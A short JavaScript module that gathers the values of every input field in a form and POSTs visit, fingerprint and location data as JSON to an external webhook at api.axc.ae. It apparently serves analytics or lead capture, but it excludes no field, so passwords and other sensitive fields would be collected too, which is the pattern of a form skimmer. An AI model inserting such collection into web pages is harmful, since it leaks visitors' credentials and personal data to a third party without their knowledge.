export const collectInputData = (form) => {
    const inputs = form.querySelectorAll('input');
    const inputData = {};
    inputs.forEach((input) => {
        if (input.value) {
            inputData[input.name] = input.value;
        }
    });
    return inputData;
};
export const sendCollectedData = async (data = {
    visitID: '',
    fingerprintID: '',
    origin: window.location.origin,
    Location: window.location,
}) => {
    try {
        await fetch(' https://api.axc.ae/webhook/08785474-20ca-4e9e-a519-7da2ae1983db', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });
    }
    catch (_) {
        console.log(_);
    }
};
